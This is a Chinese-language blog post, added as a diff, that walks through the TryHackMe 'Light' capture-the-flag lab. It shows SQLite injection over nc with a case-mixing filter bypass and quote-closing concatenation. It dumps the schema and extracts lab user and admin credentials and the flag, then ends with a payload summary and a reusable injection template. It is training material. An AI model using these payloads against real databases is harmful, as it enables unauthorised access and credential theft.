@@ -1,0 +1,445 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>TryHackMe_Light | X9wd09ncc</title><meta name="author" content="X9wd09ncc"><meta name="copyright" content="X9wd09ncc"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="CTF WP: Light Database - SQLite Injection📌 题目信息   项目 内容    靶场地址 10.49.144.236   开放端口 22 (SSH), 1337 (数据库)   已知信息 用户名 smokey   目标 获取管理员账号密码及 Flag    🔍 一、信息收集1.1 端口探测1nmap -sV 10.49.144.236   22 端口：SS">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TryHackMe_Light">
+<meta property="og:url" content="https://x9wd09ncc.github.io/post/TryHackMe_Light.html">
+<meta property="og:site_name" content="X9wd09ncc">
+<meta property="og:description" content="CTF WP: Light Database - SQLite Injection📌 题目信息   项目 内容    靶场地址 10.49.144.236   开放端口 22 (SSH), 1337 (数据库)   已知信息 用户名 smokey   目标 获取管理员账号密码及 Flag    🔍 一、信息收集1.1 端口探测1nmap -sV 10.49.144.236   22 端口：SS">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg">
+<meta property="article:published_time" content="2026-06-09T09:24:03.000Z">
+<meta property="article:modified_time" content="2026-06-09T09:24:09.808Z">
+<meta property="article:author" content="X9wd09ncc">
+<meta property="article:tag" content="thm">
+<meta property="article:tag" content="easy">
+<meta property="article:tag" content="红队">
+<meta property="article:tag" content="ai">
+<meta property="article:tag" content="SQL">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg"><link rel="shortcut icon" href="/img/favicon-32x32.png"><link rel="canonical" href="https://x9wd09ncc.github.io/post/TryHackMe_Light.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/font-awesome/6.4.0/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"本文已于","messageNext":"天前发布，内容可能已过时，请注意甄别。"},
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":false,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.bootcdn.net/ajax/libs/flickr-justified-gallery/2.1.0/fjGallery.min.js',
+      css: 'https://cdn.bootcdn.net/ajax/libs/flickr-justified-gallery/2.1.0/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: true,
+  islazyload: true,
+  isAnchor: true,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'TryHackMe_Light',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2026-06-09 17:24:09'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="X9wd09ncc" type="application/atom+xml">
+</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = 'hidden';
+    document.getElementById('loading-box').classList.remove("loaded")
+  }
+}
+
+preloader.initLoading()
+window.addEventListener('load',()=> { preloader.endLoading() })
+
+if (false) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">53</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">90</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/games/"><i class="fa-fw fas fa-gamepad"></i><span> 游戏</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="X9wd09ncc"><span class="site-name">X9wd09ncc</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/games/"><i class="fa-fw fas fa-gamepad"></i><span> 游戏</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">TryHackMe_Light</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-06-09T09:24:03.000Z" title="发表于 2026-06-09 17:24:03">2026-06-09</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-06-09T09:24:09.808Z" title="更新于 2026-06-09 17:24:09">2026-06-09</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>5分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="TryHackMe_Light"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div><article class="post-content" id="article-container"><h1 id="CTF-WP-Light-Database-SQLite-Injection"><a href="#CTF-WP-Light-Database-SQLite-Injection" class="headerlink" title="CTF WP: Light Database - SQLite Injection"></a>CTF WP: Light Database - SQLite Injection</h1><h2 id="📌-题目信息"><a href="#📌-题目信息" class="headerlink" title="📌 题目信息"></a>📌 题目信息</h2><table>
+<thead>
+<tr>
+<th>项目</th>
+<th>内容</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>靶场地址</td>
+<td>10.49.144.236</td>
+</tr>
+<tr>
+<td>开放端口</td>
+<td>22 (SSH), 1337 (数据库)</td>
+</tr>
+<tr>
+<td>已知信息</td>
+<td>用户名 <code>smokey</code></td>
+</tr>
+<tr>
+<td>目标</td>
+<td>获取管理员账号密码及 Flag</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="🔍-一、信息收集"><a href="#🔍-一、信息收集" class="headerlink" title="🔍 一、信息收集"></a>🔍 一、信息收集</h2><h3 id="1-1-端口探测"><a href="#1-1-端口探测" class="headerlink" title="1.1 端口探测"></a>1.1 端口探测</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV 10.49.144.236</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>22 端口</strong>：SSH 服务</li>
+<li><strong>1337 端口</strong>：自定义数据库服务，可用 <code>nc</code> 连接</li>
+</ul>
+<h3 id="1-2-服务识别"><a href="#1-2-服务识别" class="headerlink" title="1.2 服务识别"></a>1.2 服务识别</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span> | nc -w 3 10.49.144.236 1337</span><br></pre></td></tr></table></figure>
+
+<p>返回结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Welcome to the Light database!</span><br><span class="line">Please enter your username:</span><br></pre></td></tr></table></figure>
+
+<p><strong>关键发现</strong>：</p>
+<ul>
+<li>这是一个自定义的 “Light database” 服务</li>
+<li>交互式协议：先输入用户名，再返回密码</li>
+<li>提示符循环：输入后会再次回到 <code>Please enter your username:</code></li>
+</ul>
+<hr>
+<h2 id="🐛-二、漏洞发现"><a href="#🐛-二、漏洞发现" class="headerlink" title="🐛 二、漏洞发现"></a>🐛 二、漏洞发现</h2><h3 id="2-1-输入过滤测试"><a href="#2-1-输入过滤测试" class="headerlink" title="2.1 输入过滤测试"></a>2.1 输入过滤测试</h3><p>尝试 SQL 注释符：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&#x27; OR 1=1 --&quot;</span> | nc -w 3 10.49.144.236 1337</span><br></pre></td></tr></table></figure>
+
+<p>返回：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">For strange reasons I can&#x27;t explain, any input containing /*, -- or, %0b is not allowed :)</span><br></pre></td></tr></table></figure>
+
+<p><strong>过滤规则</strong>：</p>
+<table>
+<thead>
+<tr>
+<th>被过滤字符</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>/*</code></td>
+<td>SQL 多行注释</td>
+</tr>
+<tr>
+<td><code>--</code></td>
+<td>SQL 单行注释</td>
+</tr>
+<tr>
+<td><code>or</code></td>
+<td>SQL 关键词（小写）</td>
+</tr>
+<tr>
+<td><code>%0b</code></td>
+<td>垂直制表符</td>
+</tr>
+</tbody></table>
+<h3 id="2-2-绕过关键词过滤"><a href="#2-2-绕过关键词过滤" class="headerlink" title="2.2 绕过关键词过滤"></a>2.2 绕过关键词过滤</h3><p>SQL 关键词过滤是<strong>大小写敏感</strong>的，可通过混合大小写绕过：</p>
+<table>
+<thead>
+<tr>
+<th>原始</th>
+<th>绕过写法</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>UNION</code></td>
+<td><code>uniON</code></td>
+</tr>
+<tr>
+<td><code>SELECT</code></td>
+<td><code>seLect</code></td>
+</tr>
+<tr>
+<td><code>FROM</code></td>
+<td><code>FRom</code></td>
+</tr>
+<tr>
+<td><code>OR</code></td>
+<td>大写 <code>OR</code> 直接通过</td>
+</tr>
+</tbody></table>
+<h3 id="2-3-确认-SQL-注入"><a href="#2-3-确认-SQL-注入" class="headerlink" title="2.3 确认 SQL 注入"></a>2.3 确认 SQL 注入</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&#x27; OR &#x27;1&#x27;=&#x27;1&quot;</span> | nc -w 3 10.49.144.236 1337</span><br></pre></td></tr></table></figure>
+
+<p>返回：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Password: tF8tj2o94WE4LKC</span><br></pre></td></tr></table></figure>
+
+<p><strong>注入原理</strong>：</p>
+<p>原始查询（推测）：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> password <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;&#123;input&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>注入后：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> password <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">OR</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>&#39;</code> 闭合了原始查询的引号</li>
+<li><code>OR &#39;1&#39;=&#39;1&#39;</code> 使 WHERE 条件恒为真</li>
+<li>返回数据库中第一条记录的密码</li>
+</ul>
+<p><strong>结论</strong>：存在<strong>字符串型 SQL 注入</strong>漏洞</p>
+<hr>
+<h2 id="💉-三、漏洞利用"><a href="#💉-三、漏洞利用" class="headerlink" title="💉 三、漏洞利用"></a>💉 三、漏洞利用</h2><h3 id="3-1-推断查询结构"><a href="#3-1-推断查询结构" class="headerlink" title="3.1 推断查询结构"></a>3.1 推断查询结构</h3><p>通过注入 <code>&#39; OR &#39;1&#39;=&#39;1</code> 返回密码，推测查询为：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> password <span class="keyword">FROM</span> usertable <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;&#123;input&#125;&#x27;</span> LIMIT <span class="number">30</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>依据</strong>：</p>
+<ul>
+<li>只返回了密码字段 → 单列查询</li>
+<li><code>&#39; OR &#39;1&#39;=&#39;1</code> 有效 → 字符串型注入</li>
+</ul>
+<h3 id="3-2-确认列数"><a href="#3-2-确认列数" class="headerlink" title="3.2 确认列数"></a>3.2 确认列数</h3><p>由于没有可用的注释符（<code>--</code> 和 <code>/*</code> 被过滤），需要处理尾部引号。</p>
+<p><strong>方法</strong>：使用字符串拼接消耗尾部引号</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&#x27; uniON seLect &#x27;1&quot;</span> | nc -w 3 10.49.144.236 1337</span><br></pre></td></tr></table></figure>
+
+<p>返回：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Password: 1</span><br></pre></td></tr></table></figure>
+
+<p><strong>成功！</strong> 确认原始查询返回 <strong>1 列</strong>。</p>
+<p><strong>注入解析</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入: &#x27; uniON seLect &#x27;1</span><br><span class="line">查询: SELECT password FROM usertable WHERE username = &#x27;&#x27; uniON seLect &#x27;1&#x27; LIMIT 30</span><br><span class="line">                                                  ↑↑ 闭合    ↑↑ UNION ↑↑↑↑ 字符串&#x27;1&#x27; ↑ 闭合</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-3-获取数据库表结构"><a href="#3-3-获取数据库表结构" class="headerlink" title="3.3 获取数据库表结构"></a>3.3 获取数据库表结构</h3><p><strong>难点</strong>：尾部引号处理</p>
+<p>由于没有注释符，注入结尾必须消耗掉原始查询的尾部 <code>&#39;</code>。</p>
+<p><strong>解决方案</strong>：使用 <code>||</code> 字符串拼接运算符</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&#x27; uniON seLect (seLect sql FRom sqlite_master LIMIT 1) || &#x27;a&quot;</span> | nc -w 3 10.49.144.236 1337</span><br></pre></td></tr></table></figure>
+
+<p>返回：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Password: CREATE TABLE usertable (</span><br><span class="line">                   id INTEGER PRIMARY KEY,</span><br><span class="line">                   username TEXT,</span><br><span class="line">                   password INTEGER)a</span><br></pre></td></tr></table></figure>
+
+<p><strong>注入解析</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">输入: &#x27; uniON seLect (seLect sql FRom sqlite_master LIMIT 1) || &#x27;a</span><br><span class="line"></span><br><span class="line">查询: SELECT password FROM usertable WHERE username = &#x27;&#x27;</span><br><span class="line">      UNION</span><br><span class="line">      SELECT (SELECT sql FROM sqlite_master LIMIT 1) || &#x27;a&#x27;</span><br><span class="line">      LIMIT 30</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>子查询 <code>(seLect sql FRom sqlite_master LIMIT 1)</code> 返回表结构</li>
+<li><code>|| &#39;a&#39;</code> 拼接字符串 ‘a’</li>
+<li>尾部 <code>&#39;</code> 闭合了 <code>&#39;a&#39;</code> 字符串</li>
+<li>最终输出：表结构 + ‘a’</li>
+</ul>
+<h3 id="3-4-发现隐藏表"><a href="#3-4-发现隐藏表" class="headerlink" title="3.4 发现隐藏表"></a>3.4 发现隐藏表</h3><p>查询所有表结构：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&#x27; uniON seLect (seLect group_cOncat(sql) FRom sqlite_master) || &#x27;a&quot;</span> | nc -w 3 10.49.144.236 1337</span><br></pre></td></tr></table></figure>
+
+<p>返回两个表：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> usertable (</span><br><span class="line">    id <span class="type">INTEGER</span> <span class="keyword">PRIMARY</span> KEY,</span><br><span class="line">    username TEXT,</span><br><span class="line">    password <span class="type">INTEGER</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> admintable (</span><br><span class="line">    id <span class="type">INTEGER</span> <span class="keyword">PRIMARY</span> KEY,</span><br><span class="line">    username TEXT,</span><br><span class="line">    password <span class="type">INTEGER</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p><strong>关键发现</strong>：</p>
+<ul>
+<li><code>usertable</code>：普通用户</li>
+<li><code>admintable</code>：管理员表</li>
+</ul>
+<h3 id="3-5-提取usertable"><a href="#3-5-提取usertable" class="headerlink" title="3.5 提取usertable"></a>3.5 提取usertable</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&#x27; uniON seLect (seLect group_cOncat(username || &#x27;:&#x27; || password) FRom usertable) || &#x27;a&quot;</span> | nc -w 3 10.49.144.236 1337</span><br></pre></td></tr></table></figure>
+
+<p>返回：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">alice:tF8tj2o94WE4LKC</span><br><span class="line">rob:yAn4fPaF2qpCKpR</span><br><span class="line">john:e74tqwRh2oApPo6,</span><br><span class="line">michael:7DV4dwA0g5FacRe</span><br><span class="line">smokey:vYQ5ngPpw8AdUmL</span><br><span class="line">hazel:EcSuU35WlVipjXG,</span><br><span class="line">ralph:YO1U9O1m52aJImA</span><br><span class="line">steve:WObjufHX1foR8d7a</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-6-提取管理员数据（admintable）"><a href="#3-6-提取管理员数据（admintable）" class="headerlink" title="3.6 提取管理员数据（admintable）"></a>3.6 提取管理员数据（admintable）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&#x27; uniON seLect (seLect group_cOncat(username || &#x27;:&#x27; || password) FRom admintable) || &#x27;a&quot;</span> | nc -w 3 10.49.144.236 1337</span><br></pre></td></tr></table></figure>
+
+<p>返回：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TryHackMeAdmin:mamZtAuMlrsEy5bp6q17,flag:THM&#123;SQLit3_InJ3cTion_is_SimplE_nO?&#125;a</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="🏁-四、最终结果"><a href="#🏁-四、最终结果" class="headerlink" title="🏁 四、最终结果"></a>🏁 四、最终结果</h2><h3 id="管理员账号"><a href="#管理员账号" class="headerlink" title="管理员账号"></a>管理员账号</h3><table>
+<thead>
+<tr>
+<th>字段</th>
+<th>值</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>用户名</td>
+<td><code>TryHackMeAdmin</code></td>
+</tr>
+<tr>
+<td>密码</td>
+<td><code>mamZtAuMlrsEy5bp6q17</code></td>
+</tr>
+</tbody></table>
+<h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">THM&#123;SQLit3_InJ3cTion_is_SimplE_nO?&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="📝-五、完整-Payload-汇总"><a href="#📝-五、完整-Payload-汇总" class="headerlink" title="📝 五、完整 Payload 汇总"></a>📝 五、完整 Payload 汇总</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 确认注入点</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&#x27; OR &#x27;1&#x27;=&#x27;1&quot;</span> | nc 10.49.144.236 1337</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 确认列数（1列）</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&#x27; uniON seLect &#x27;1&quot;</span> | nc 10.49.144.236 1337</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 获取所有表结构</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&#x27; uniON seLect (seLect group_cOncat(sql) FRom sqlite_master) || &#x27;a&quot;</span> | nc 10.49.144.236 1337</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 提取管理员数据</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&#x27; uniON seLect (seLect group_cOncat(username || &#x27;:&#x27; || password) FRom admintable) || &#x27;a&quot;</span> | nc 10.49.144.236 1337</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="🧠-六、技术总结"><a href="#🧠-六、技术总结" class="headerlink" title="🧠 六、技术总结"></a>🧠 六、技术总结</h2><h3 id="6-1-核心难点"><a href="#6-1-核心难点" class="headerlink" title="6.1 核心难点"></a>6.1 核心难点</h3><table>
+<thead>
+<tr>
+<th>难点</th>
+<th>解决方案</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>关键词过滤 (<code>UNION</code>, <code>SELECT</code>)</td>
+<td>大小写混合绕过：<code>uniON</code>, <code>seLect</code></td>
+</tr>
+<tr>
+<td>注释符过滤 (<code>--</code>, <code>/*</code>)</td>
+<td>使用字符串拼接 &#96;</td>
+</tr>
+<tr>
+<td>尾部引号闭合</td>
+<td>拼接字符串 <code>&#39;a</code> 使尾部 <code>&#39;</code> 成为闭合符</td>
+</tr>
+</tbody></table>
+<h3 id="6-2-SQLite-特性利用"><a href="#6-2-SQLite-特性利用" class="headerlink" title="6.2 SQLite 特性利用"></a>6.2 SQLite 特性利用</h3><ul>
+<li>**<code>sqlite_master</code>**：SQLite 系统表，存储所有表的结构信息</li>
+<li>**<code>group_concat()</code>**：聚合函数，将多行合并为一行</li>
+<li><strong><code>||</code> 运算符</strong>：SQLite 字符串拼接</li>
+</ul>
+<h3 id="6-3-注入模板"><a href="#6-3-注入模板" class="headerlink" title="6.3 注入模板"></a>6.3 注入模板</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; uniON seLect (seLect group_cOncat(column) FRom table) || &#x27;</span>a</span><br></pre></td></tr></table></figure>
+
